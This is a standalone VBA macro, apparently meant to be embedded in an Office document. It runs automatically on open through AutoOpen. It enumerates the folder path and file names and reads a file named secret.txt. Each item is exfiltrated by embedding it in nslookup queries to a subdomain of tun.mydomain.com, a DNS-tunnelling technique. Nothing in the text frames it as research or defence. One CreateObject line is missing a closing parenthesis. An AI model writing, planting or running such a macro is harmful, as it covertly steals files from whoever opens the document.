Sub AutoOpen()
    Dim objHttp: Set objHttp = CreateObject("Microsoft.XMLHTTP")
    Dim objShell: Set objShell = CreateObject("WScript.Shell")
    Dim objFSO: Set objFSO = CreateObject("Scripting.FileSystemObject"
    Dim objFolder: Set objFolder = objFSO.GetFolder(".")
    
    objShell.Exec ("%comspec% /c nslookup " & objFolder.Path & ".tun.mydomain.com")

    Set colFiles = objFolder.Files
    buff = ""
    For Each objFile In colFiles
        buff = Replace(objFile.Name, " ", "_")
        buff = Replace(buff, ".", "_")
        objShell.Exec ("%comspec% /c nslookup " & buff & ".tun.mydomain.com")
    Next
    
    secretname = objFolder.Path & "\secret.txt"
    Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(secretname, 1)
    buff = objFileToRead.ReadAll()
    objFileToRead.Close
    Set objFileToRead = Nothing

    objShell.Exec ("%comspec% /c nslookup " & buff & ".tun.mydomain.com")
    
End Sub

